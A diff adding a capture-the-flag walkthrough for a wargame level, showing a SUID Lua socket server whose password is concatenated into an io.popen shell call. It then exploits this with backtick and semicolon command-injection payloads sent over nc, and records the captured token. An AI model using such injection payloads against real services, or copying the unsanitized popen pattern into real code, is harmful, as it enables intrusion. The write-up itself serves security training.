@@ -1,0 +1,35 @@
+1. List files in the directory:
+   ll
+   # Output shows: level11.lua script with SUID permissions owned by flag11
+
+2. Analyze the Lua script:
+   cat level11.lua
+   # Script runs a socket server on port 5151
+   # Takes password input and hashes it with sha1sum
+   # Vulnerable line: prog = io.popen("echo "..pass.." | sha1sum", "r")
+
+3. Identify the vulnerability:
+   # The password input is directly concatenated into shell command
+   # This allows command injection via special characters
+
+4. Start the server in background:
+   ./level11.lua &
+
+5. Test connection:
+   nc 127.0.0.1 5151
+   # Server responds with "Password: "
+
+6. Exploit command injection:
+   # Use backticks or semicolon to inject commands
+   echo 'password`getflag > /tmp/flag11`' | nc 127.0.0.1 5151
+   # or
+   echo 'password; getflag > /tmp/flag11; echo' | nc 127.0.0.1 5151
+
+7. Check the result:
+   cat /tmp/flag11
+   # Output: Check flag.Here is your token : fa6v5ateaw21peobuub8ipe6s
+
+TECHNIQUE: Command injection in shell command construction
+VULNERABILITY: Unsanitized user input concatenated into io.popen() call
+PAYLOAD: password`getflag > /tmp/flag11` - Command substitution injection
+TOKEN: fa6v5ateaw21peobuub8ipe6s
